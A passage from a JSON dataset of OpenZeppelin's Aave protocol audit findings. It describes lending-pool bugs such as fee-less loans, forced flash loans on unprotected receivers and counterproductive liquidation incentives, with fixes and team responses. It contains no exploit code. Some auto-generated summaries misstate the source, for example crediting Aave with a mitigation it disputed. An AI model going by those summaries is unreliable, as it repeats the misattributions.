the `borrow` function and its calculations were thoroughly tested (as suggested throughout our original assessment).\n\n\n**Update**: *Fixed in [MR#116](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/116/diffs).*",
      "summary": "\nIn the `LendingPool` contract of Aave, there is an issue present in the `borrow` function which causes the calculated borrow amount in ETH to be lower than expected. The issue is that the borrow fee is only calculated *after* it is first used. This means that when the requested borrow amount in ETH is calculated, the `vars.borrowFee` variable is zero. As a consequence, the calculated borrow amount in ETH will be lower than expected, inevitably lowering the actual amount of collateral needed in ETH to accept the borrow operation.\n\nTo fix this issue, the `borrow` function should be refactored so that the borrow fee is first calculated, and then the `vars.borrowFee` variable is used for further operations. This issue should have been caught if the `borrow` function and its calculations were thoroughly tested. The issue has now been fixed in Merge Request #116.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11615",
      "title": "[M10] Missing test coverage report",
      "impact": "MEDIUM",
      "content": "There is no automated test coverage report. Without this report it is impossible to know whether there are parts of the code never executed by the automated tests; so for every change, a full manual test suite has to be executed to make sure that nothing is broken or misbehaving. High test coverage is of utter importance in projects like the Aave protocol, where large sums of valuable assets are expected to be handled safely and bugs can cause important financial losses.\n\n\nConsider adding the test coverage report, and making it reach at least 95% of the source code.\n\n\n**Update**: *Acknowledged, and fix in progress. The Aave team was working on setting up coverage on a separate branch during our audit. Given the tools are still immature and unstable, some problems arised in the process which are now being solved by customizing the coverage tools to Aaves needs. The team is fully aware of the importance of high test coverage, and is striving to reach at least 95% coverage before launch.*",
      "summary": "\nThis bug report is about the lack of automated test coverage report for the Aave protocol. Without this report, it is impossible to know if there are parts of the code that are not being tested by the automated tests. This is a problem because high test coverage is important for projects like Aave, where large sums of valuable assets are expected to be handled safely and bugs can cause financial losses. The report recommends adding the test coverage report and making it reach at least 95% of the source code.\n\nThe bug report has been acknowledged and a fix is in progress. The Aave team was working on setting up coverage on a separate branch during the audit, but some problems arose due to the tools being immature and unstable. The team is aware of the importance of high test coverage and is working to reach at least 95% coverage before launch.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11614",
      "title": "[M09] Sensitive mathematical operations are not explicitly documented",
      "impact": "MEDIUM",
      "content": "Intending to make the platform as transparent as possible, the Aave team has implemented most of the calculations the Aave protocol relies on in their smart contracts. Such calculations usually entail complex arithmetic operations over balances, timestamps, rates, percentages, prices, decimals, among others, that are measured in several different units. It is of utmost importance for such operations to work flawlessly, considering that the Aave protocol is set out to handle large amounts of valuable assets, and any error may cause outstanding financial losses. However, such sensitive operations were found to be sparsely documented, the most important shortcoming being the lack of explicit units for each term involved.\n\n\nThis lack of explicit units for state variables, parameters and return values greatly hindered the auditing process. While attempts to validate all calculations spread throughout the code base were made, still the manual process was unreliable and error-prone. Mapping formulas to the provided whitepaper was not straightforward either, because there are many mismatches  as reported in [**[L18] Whitepaper issues**](#l18). Assessing for correctness becomes difficult when there is no way to straightforwardly understand the units used in each calculation, regardless of their simplicity. These are the reasons why we are listing this issue with Medium severity.\n\n\nGreat efforts must be made in term of documenting calculations and explicitly stating all units of the terms involved. This should greatly improve the readability of the code, which should add to the platforms transparency and the users overall experience. As the process of manually auditing all sensitive arithmetic operations has been proven hard-to-follow, unreliable and potentially error-prone, thorough unit testing of all critical calculations is in order to programmatically ensure that the codes current behavior is expected.\n\n\n**Update**: *Partially fixed. The most recent whitepaper shared with us is significantly clearer. However, the units of the variables in the `CoreLibrary.sol` structs are still undocumented.*",
      "summary": "\nThe Aave team was attempting to make their platform as transparent as possible by implementing calculations in their smart contracts. These calculations involve complex arithmetic operations over different units, making it essential that they work flawlessly to avoid financial losses. However, the calculations were sparsely documented and lacked explicit units for the terms involved. This made auditing the code difficult and unreliable, and prevented validation of the formulas in the whitepaper. \n\nTo improve the readability of the code and the users experience, it is necessary to document the calculations and explicitly state all units of terms involved. Additionally, thorough unit testing of all critical calculations should be done to programmatically ensure that the codes behavior is expected.\n\nThe issue has been partially fixed with the most recent whitepaper being clearer. However, the units of the variables in the `CoreLibrary.sol` structs are still undocumented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11613",
      "title": "[M08] Interest may compound unpredictably",
      "impact": "MEDIUM",
      "content": "In the Aave protocol, loans interest is compounded after relevant interest accruing transactions occur (with a difference between fixed-rate and variable-rate loans, reported in [**[N02] Fixed-rate loans may never compound**](#n02)). Between two such transactions, the system uses a simple interest rate model.\n\n\nThe code is designed to accrue interest as frequently as possible, but this requirement expands the responsibility of accruing interest into otherwise unrelated functions. Additionally, the size of the discrepancy between the computed and theoretical interest will depend on the volume of transactions being handled by the Aave protocol, which may change unpredictably.\n\n\nTo improve predictability and functional encapsulation, consider calculating interest with the compound interest formula, rather than simulating it through repeated transactions. The [`modexp` precompile](https://medium.com/@rbkhmrcr/precompiles-solidity-e5d29bd428c4) may assist in lowering gas fees. Alternatively, consider informing users that the protocols interest rates are merely *estimations* rather than exact rates.\n\n\n**Update**: *The Aave team acknowledges this issue:*\n\n\n\n> \n>  We acknowledge this issue, as also strictly correlated with N02. As a result, we will evaluate before the mainnet release what will be the implementation cost and the benefits of switching to a compounded interest rate formula, and eventually modify the implementation accordingly.\n> \n> \n>",
      "summary": "\nA bug report has been filed regarding the Aave protocol's loan interest accrual system. Currently, the system uses a simple interest rate model to accrue interest between two relevant transactions. This requirement expands the responsibility of accruing interest into unrelated functions, and the discrepancy between the computed and theoretical interest rates may change unpredictably. To improve predictability and functional encapsulation, it is suggested that the compound interest formula be used instead, or that users be informed that the protocol's interest rates are merely estimations. The Aave team has acknowledged this issue and will evaluate the cost and benefits of switching to a compounded interest rate formula before the mainnet release.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11612",
      "title": "[M07] Lack of event emission after rebalancing fixed borrow rate",
      "impact": "MEDIUM",
      "content": "The [`rebalanceFixedBorrowRate` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L493) in the `LendingPool` contract allows anyone to rebalance the fixed interest rate of a user under specific circumstances. However, the function does not emit an event after the rebalancing is executed.\n\n\nAs such a sensitive change is of utter importance to users, consider defining and emitting an event in order to notify clients about it.\n\n\n**Update**: *Fixed in [MR#80](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/80/diffs). A `RebalanceStableBorrowRate` event has been defined and is now emitted after successful rebalances of stable-rate loans.*",
      "summary": "\nThis bug report is about the `rebalanceFixedBorrowRate` function in the `LendingPool` contract, which allows users to rebalance the fixed interest rate of a user. The issue is that the function does not emit an event after the rebalancing is executed. This is important for users to be notified about the change, so a `RebalanceStableBorrowRate` event was defined and emitted after successful rebalances of stable-rate loans. The bug has been fixed in Merge Request #80.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11611",
      "title": "[M06] Successful redeem of aTokens may not pay assets in exchange",
      "impact": "MEDIUM",
      "content": "The [`redeem` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/tokenization/AToken.sol#L73) in the `AToken` contract allows holders of aTokens to redeem them for the underlying asset. Assuming all necessary conditions for a successful redeem are met, the expected behavior would be that for every token redeemed a certain amount (given by the exchange rate) of the underlying asset is taken from the pool and transferred to the redeemer.\n\n\nHowever, when the amount of aTokens to be redeemed is lower than the amount of aTokens the system exchanges per unit of the underlying asset, the transaction does not revert. In such cases, the system would still take the aTokens, [burn them](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/tokenization/AToken.sol#L78), and [transfer 0 units](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L143) of the underlying asset to the redeemer. Therefore, the caller would lose all redeemed aTokens and the total supply of aTokens would be reduced without modifying the underlying asset reserves liquidity.\n\n\nTo prevent unexpected behaviors that may lead to losses of aTokens, consider reverting the transaction when the amount of redeemed tokens is not enough to receive at least one unit of the underlying asset in exchange.\n\n\n**Update**: *Fixed in [MR#79](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/79/diffs). The transaction is now reverted when the amount of redeemed tokens is not enough to receive at least one unit of the underlying asset in exchange.*",
      "summary": "\nThis bug report is about the `redeem` function in the `AToken` contract. This function allows holders of aTokens to redeem them for the underlying asset. Normally, this function should take a certain amount of aTokens from the redeemer and transfer the corresponding amount of the underlying asset to the redeemer. However, when the amount of aTokens to be redeemed is lower than the amount of aTokens the system exchanges per unit of the underlying asset, the transaction does not revert. This means that the caller would lose all redeemed aTokens and the total supply of aTokens would be reduced without modifying the underlying asset reserves liquidity. To prevent this unexpected behavior, the transaction should be reverted when the amount of redeemed tokens is not enough to receive at least one unit of the underlying asset in exchange. This bug has been fixed in the Merge Request #79, so the transaction is now reverted when the amount of redeemed tokens is not enough to receive at least one unit of the underlying asset in exchange.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11610",
      "title": "[M05] Push-payments pattern may render ETH deposits impossible to redeem",
      "impact": "MEDIUM",
      "content": "When redeeming ETH deposits, the `LendingPoolCore` contract [follows the push-payments pattern](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolCore.sol#L657) to return the deposited Ether. Such a pattern, implemented using the `transfer` function, has some notable shortcomings when the redeemer is a smart contract, which can render ETH deposits impossible to redeem. Specifically, the redeem will inevitably fail when:\n\n\n* The redeemer smart contract does not implement a payable fallback function.\n* The redeemer smart contract implements a payable fallback function which uses more than 2300 gas units.\n* The redeemer smart contract implements a payable fallback function which needs less than 2300 gas units, but is called through a proxy that raises the calls gas usage above 2300.\n\n\nNote that the upcoming Istanbul fork can further aggravate this issue, since payable fallback functions that today *do not* consume more than 2300 gas units may effectively go above the threshold after the fork. This is due to [EIP 1884](https://eips.ethereum.org/EIPS/eip-1884).\n\n\nTo prevent unexpected behavior and potential loss of funds, consider explicitly warning end-users about the mentioned shortcomings to raise awareness *before* they deposit Ether into the Aave protocol. Additionally, note that the low-level call `call.value(_amount)(\"\")` can be used to transfer the redeemed Ether without being limited to 2300 gas units. Risks of reentrancy stemming from the use of this low-level call can be mitigated by tightly following the [Check-effects-interactions pattern](https://solidity.readthedocs.io/en/v0.5.9/security-considerations.html#use-the-checks-effects-interactions-pattern) and using [OpenZeppelins `ReentrancyGuard` contract](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v2.3.0/contracts/utils/ReentrancyGuard.sol).\n\n\n**Update**: *Partially fixed in [MR#78](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/78/diffs). We consider it Partially fixed since the fact that redeemer smart contracts must implement a payable fallback function is still not documented. As suggested, functions `transferToUser`, `transferToFeeCollectionAddress` and `transferToReserve` replaced the call to `transfer` with a low-level call. Furthermore, we have our reservations around hard-coding a gas limit on Ether transfers, but the fix works as intended. In Aaves words:*\n\n\n\n> \n>  As a further safety check, we decided to limit the maximum gas consumption of the receiver default function to 50.000, which is below the minimum cost of any user-oriented function on the `LendingPool` contract. This limit might be revised in the future and/or moved to a global configuration parameter.\n> \n> \n>",
      "summary": "\nThis bug report is about a problem with the `LendingPoolCore` contract when redeeming ETH deposits. The problem is that when the redeemer is a smart contract, the redeem will fail when the smart contract does not implement a payable fallback function, or if the function uses more than 2300 gas units. This issue could be further aggravated after the Istanbul fork due to EIP 1884. To prevent unexpected behavior and potential loss of funds, users should be warned before they deposit Ether into the Aave protocol. Additionally, a low-level call `call.value(_amount)(\"\")` can be used to transfer the redeemed Ether without being limited to 2300 gas units. This can be done safely by following the Check-effects-interactions pattern and using OpenZeppelins `ReentrancyGuard` contract. This issue has been partially fixed in MR#78, where functions `transferToUser`, `transferToFeeCollectionAddress` and `transferToReserve` were replaced with a low-level call. A gas limit of 50,000 was also added as a safety check.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11609",
      "title": "[M04] Borrower cannot partially repay interest of a loan",
      "impact": "MEDIUM",
      "content": "The [`repay` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L329) of the `LendingPool` contract allows a borrower to repay a loan in a specific reserve. However, it is currently impossible for the borrower to partially repay the interest of a loan. This is due to the fact that whenever the `borrowBalanceIncrease` is greater than the `paybackAmountMinusFees`, [the transaction will be reverted](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L371).\n\n\nShould this be the functions intended behavior, consider explicitly documenting it in docstrings. Otherwise, consider implementing the necessary logic to prevent `repay` from reverting when `borrowBalanceIncrease` is greater than the `paybackAmountMinusFees`, allowing borrowers to partially repay their loans interest.\n\n\n**Update**: *Fixed in [MR#77](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/77/diffs).*",
      "summary": "\nThe `repay` function of the `LendingPool` contract allows borrowers to repay a loan in a specific reserve. Currently, however, it is impossible for a borrower to partially repay the interest of a loan. This is due to the fact that the transaction reverts when the `borrowBalanceIncrease` is greater than the `paybackAmountMinusFees`.\n\nTo address this issue, it is suggested that either the necessary logic is implemented to prevent `repay` from reverting when `borrowBalanceIncrease` is greater than the `paybackAmountMinusFees`, or that the intended behavior of the function is explicitly documented in docstrings.\n\nThis issue has been fixed in Merge Request #77.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11608",
      "title": "[M03] Incorrect refund address during repay",
      "impact": "MEDIUM",
      "content": "The [`repay` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L329) allows repayment of a loan on behalf of other accounts. In a scenario where the caller overpays Ether on behalf of another account, the function will [refund the excess Ether](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolCore.sol#L692-694) to the target address (*i.e.* the address passed in the [`_onBehalfOf` parameter](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L332)) and not the caller.\n\n\nWhenever a loan is overpaid with Ether, consider returning all excess Ether to the actual repayer and not the account on whose behalf the loan is being repaid.\n\n\n**Update**: *Fixed in [MR#76](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/76/diffs). All excess Ether is now returned to the actual repayer (i.e. the caller).*",
      "summary": "\nThis bug report is about the `repay` function of the Aave lending pool contracts. This function allows repayment of a loan on behalf of other accounts. In a scenario where the caller overpays Ether on behalf of another account, the function will refund the excess Ether to the target address and not the caller. The bug report suggested that all excess Ether should be returned to the actual repayer and not the account on whose behalf the loan is being repaid. This issue has been fixed in Merge Request #76, where all excess Ether is now returned to the actual repayer (i.e. the caller).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11607",
      "title": "[M02] Anyone can open a flash loan for an unprotected receiver",
      "impact": "MEDIUM",
      "content": "The [`flashLoan` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L602) in the `LendingPool` contract allows anyone to execute a flash loan on the Aave protocol. The caller can specify in the [`_receiver`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L603) argument any contract address that implements the [`IFlashLoanReceiver` interface](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/flashloan/interfaces/IFlashLoanReceiver.sol).\n\n\nShould the receiver contract not implement the necessary validations to identify who originally triggered the transaction, it may be possible for an attacker to force any `IFlashLoanReceiver` contract to open arbitrary flash loans in the Aave protocol that would inevitably pay the corresponding fees. This can potentially drain all funds (ETH or tokens) from the vulnerable contract implementing the `IFlashLoanReceiver` interface. It should be highlighted that [the provided `FlashLoanReceiverBase` contract](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/flashloan/base/FlashLoanReceiverBase.sol) does not include any security measure, nor warning documentation, to prevent this issue.\n\n\nTo reduce the attack surface, it is advisable to modify the `flashLoan` function so that only the receiver of the loan can execute it. If opening flash loans on behalf of `IFlashLoanReceiver` contracts is an intended feature, then consider adding user-friendly documentation to raise awareness, along with sample implementations showcasing how to defend from attackers that attempt to open flash loans on behalf of unprotected `IFlashLoanReceiver` contracts.\n\n\n**Update**: *The Aave team understands this is not an actual security issue of the Aave protocol, but will still provide enough documentation to raise awareness in developers. In Aaves words:*\n\n\n\n> \n>  We believe that this should not be reported as a security issue of the protocol as it doesnt actually show any risk for the protocol itself, but rather a potential risk on an unsafe implementation of a `IFlashLoanReceiver`. Moreover, the solution proposed greatly diminishes the possibility of avoiding front-running by using a multiple contracts strategy, which was the reason why the `flashLoan` method does not place any safety check on the caller of the function. As the potential security issue might not be immediately visible to a developer of a flash loan receiver, we will make sure to properly document this issue and provide the developers with adequate code samples.\n> \n> \n>",
      "summary": "\nThis bug report is about the `flashLoan` function in the `LendingPool` contract of the Aave protocol. This function allows anyone to execute a flash loan on the Aave protocol and specify any contract address that implements the `IFlashLoanReceiver` interface as the `_receiver`. If the receiver contract does not implement the necessary validations to identify who originally triggered the transaction, it could be possible for an attacker to force any `IFlashLoanReceiver` contract to open arbitrary flash loans in the Aave protocol, draining all funds from the vulnerable contract. \n\nThe Aave team has acknowledged the potential security issue and proposed a solution to reduce the attack surface by modifying the `flashLoan` function so that only the receiver of the loan can execute it. If opening flash loans on behalf of `IFlashLoanReceiver` contracts is an intended feature, then they suggest adding documentation to raise awareness, along with sample implementations to defend against attackers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11606",
      "title": "[M01] Fee-less loans",
      "impact": "MEDIUM",
      "content": "The [`calculateLoanOriginationFee` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/fees/FeeProvider.sol#L27) of the `FeeProvider` contract is in charge of calculating the origination fee for a loan of the specified amount. To do so, it [multiplies the given amount by the `originationFeePercentage`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/fees/FeeProvider.sol#L28)  a hardcoded value [set during construction to `0.0025 * 1e18`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/fees/FeeProvider.sol#L20).\n\n\nDue to how the [`wadMul`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/libraries/WadRayMath.sol#L38) multiplication works in this particular case, `calculateLoanOriginationFee` can return 0 for amounts greater than 0. Such unexpected behavior would allow for a user to take loans that would not pay an origination fee. In particular, all loans with an amount lower than 200 will be granted without accounting for a fee (see this simple [mathematical proof](https://www.wolframalpha.com/input/?i=Quotient%5B%28+%281e18+%2F+2%29+%2B+x+*+%280.0025e18%29+%29%2C+1e18%5D+%3D+0+%2C+x+%3E+0) for validation).\n\n\nShould loans be expected to always charge a fee, consider implementing the necessary validations in `calculateLoanOriginationFee` so that the transaction reverts in case the calculated fee is zero. Otherwise, consider clearly documenting this behavior to prevent unexpected outcomes. Either way, it is highly advisable to implement thorough unit tests related to this feature, as no unit tests were found for the `calculateLoanOriginationFee` function.\n\n\n**Update**: *Fixed in [MR#75](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/75/diffs). Now all loans that would not pay a fee are rejected.*",
      "summary": "\nThis bug report is related to the `calculateLoanOriginationFee` function of the `FeeProvider` contract. This function is responsible for calculating the origination fee for a loan of the specified amount. It multiplies the given amount by the `originationFeePercentage`  a hardcoded value set during construction.\n\nDue to how the `wadMul` multiplication works in this particular case, `calculateLoanOriginationFee` can return 0 for amounts greater than 0. This would allow for a user to take loans that would not pay an origination fee, which is not expected behavior.\n\nTo fix this issue, validations should be implemented in `calculateLoanOriginationFee` so that the transaction reverts in case the calculated fee is zero. Alternatively, it should be clearly documented. Additionally, it is highly advisable to implement thorough unit tests related to this feature.\n\nThe issue has been fixed in MR#75. Now all loans that would not pay a fee are rejected.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11605",
      "title": "[H09] Fixed-rate loans can be repeatedly rebalanced",
      "impact": "HIGH",
      "content": "Any users fixed-rate loan [can be rebalanced](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L493) if the rate falls outside an acceptable range. The lower boundary of this range is the current liquidity rate, while the upper boundary is intended to be a [configurable percentage](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolParametersProvider.sol#L38-40) higher than the reserves fixed borrow rate.\n\n\nHowever, the upper threshold is [set below the reserves fixed borrow rate](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L520-525). This means that new loans will start outside the acceptable range and will remain that way after rebalancing so that fixed-rate loans are actually vulnerable to any change in the market rate.\n\n\nConsider redefining the upper threshold to be higher than the reserve rate (by the configurable down-rate delta parameter) rather than lower by that percentage. Related issues that must be taken into consideration are [**[H06] It is impossible to rebalance another accounts fixed borrow rate**](#h06) and [**[C04] Rogue borrower can manipulate other accounts borrow balance**](#c04).\n\n\n**Update**: *Fixed in [MR#44](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/44/diffs). This issue was originally labeled as Critical since it implies fixed-rate loans can be made to follow the variable rate. After discussing with the Aave team, it has been downgraded to High. In Aaves words:*\n\n\n\n> \n>  Although the logic flaw exposed caused unwanted behavior that needed fix, this issue didnt actually pose any security risk for the protocol, and is actually ending up in a potentially acceptable use case.\n> \n> \n>",
      "summary": "\nThis bug report is about a flaw in the code that affects the fixed-rate loans. The code is intended to rebalance any loan if the rate falls outside an acceptable range, with the lower boundary being the current liquidity rate and the upper boundary being a configurable percentage higher than the reserves fixed borrow rate. However, the upper threshold is set below the reserves fixed borrow rate, meaning that new loans will start outside the acceptable range and will remain that way after rebalancing. This essentially means that fixed-rate loans are actually vulnerable to any change in the market rate. \n\nThe issue has been fixed in Merge Request #44, after being discussed with the Aave team. The team concluded that although the logic flaw exposed caused unwanted behavior that needed to be fixed, it did not pose any security risk for the protocol and is actually ending up in a potentially acceptable use case.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11604",
      "title": "[H08] Counterproductive incentives",
      "impact": "HIGH",
      "content": "The Aave protocol requires all loans to be backed by more-than-100% collateral in other asset pools. To maintain this condition as the asset prices vary, there is a safety mechanism that allows anyone to repay loans that are at risk of becoming insolvent. Typically, this encourages arbitrageurs to improve the health of the loans but there are some conditions where the safety mechanism behaves counter-productively, and takes at-risk loans and actively pushes them into insolvency.\n\n\nConsider a borrower with collateral in various markets worth a total of `C`, and a total debt worth `D`. They are located at point (`D`, `C`) in the following diagram:\n\n\n![](https://i0.wp.com/blog.openzeppelin.com/wp-content/uploads/2019/11/ethlend_incentive_diagram.jpg?resize=376%2C342&ssl=1)\n\n\nAfter accounting for the distribution of collateral and the thresholds associated with each reserve, they are assigned a *liquidation threshold*. With these definitions, we can describe the important regions:\n\n\n* Users in the green region above the liquidation threshold are fully collateralized. Their collateral exceeds their debt by an acceptable safety margin.\n* Users in the red region are insolvent. Their debt is larger than their collateral and they no longer have any incentive to repay it. Users in this region can be a major problem for the system because they continue accruing interest while removing liquidity from the reserve, ensuring at least some aToken holders will be unable to redeem their assets.\n* Users in the purple region are under-collateralized. They still have more assets than debt in the system, but the protocol deems them to be at risk of becoming insolvent.\n\n\nWhen a borrower is under-collateralized, anyone can repay some of their debt in exchange for collateral at better-than-market rates. This mechanism is parameterized by two global values:\n\n\n* Liquidation close factor percentage: the maximum fraction of the original loan that can be liquidated (currently set at 50%)\n* Liquidation bonus `L`: how much collateral do arbitrageurs receive (as a multiplier of the amount paid)\n\n\nThe liquidation line on the diagram has slope `L` and passes through the origin. When an arbitrageur repays `x` debt, they receive `x*L` collateral from the borrower. In other words, they force the borrower to the bottom-left of the diagram on a trajectory parallel to the liquidation line. The crucial observation is that this process can never cause a borrower to cross the liquidation line. Borrowers above the line are liquidated until they are fully collateralized, but borrowers below the line are actually pushed further towards insolvency by the liquidation process.\n\n\nWhenever the leftover debt is more than the leftover collateral after a liquidation event, the user is insolvent. If we additionally denote the close factor as `Cf`:\n\n\nThe maximum liquidation amount would be `Cf * D` with the remaining debt being `(1 - Cf) * D`.\n\n\nThe value of collateral the liquidator receives (including the bonus) would be `Cf * D * L`, so the remaining collateral becomes `C - Cf * L * D`.\n\n\nThe would become insolvent if the remaining debt is greater than the remaining collateral. This occurs when `( 1 - Cf ) * D &gt; C - Cf * L * D`, or rearranging, `D / C &gt; 1 / ( 1 + Cf * (L - 1))`. If we assume a liquidation bonus of 1.05 and a close factor of 0.5, then **when a borrowers debt rises to at least 1 / 1.05 = 95.2% of the value of their collateral the liquidations start increasing their debt-to-collateral ratio and at 97.6% it is possible for a liquidation to force them into insolvency**.\n\n\nIdeally, they would have already been liquidated before they cross the threshold, but this may not happen depending on various factors outside of the protocol, such as the speed of price changes, the liveness of the oracles, the congestion of Ethereum and the responsiveness and liquidity of arbitrageurs. To this end, it may prove useful to run off-chain monitoring of all above mentioned parameters, along with auto-liquidation mechanisms, to address the risk as early as possible.\n\n\nNevertheless, in the event that the borrower crosses the liquidation line, the protocol can no longer sustain the same bonus, since each liquidation event now increases the risk to the protocol. This observation has the unfortunate consequence that the incentive for arbitrageurs to liquidate a risky loan is weaker when it is more crucial. Even so, a weakly productive incentive (or indeed no incentive at all) is still preferable to a counterproductive one. The reduced incentive may be compensated by increasing the close factor for the most at-risk loans or perhaps even allowing arbitrageurs to liquidate 100% of the loan in exchange for 100% of the remaining collateral.\n\n\nConsider adjusting the parameters in the liquidation mechanism to ensure it is always pushes borrowers and the protocol towards solvency.\n\n\n**Update**: *The Aave team acknowledges the issue:*\n\n\n\n> \n>  We consider this issue as a part of the dynamics of the protocol, and there is no easy solution as reducing or removing the liquidation incentives in case of extreme undercollateralization would remove the incentive for external liquidators to execute the liquidation, which would still bring insolvency. In the future, we plan to challenge this issue with i) Automated liquidation through decentralized exchanges, to be implemented together with external liquidation and ii) An insurance fund to cover liqudation risk.\n> \n> \n>",
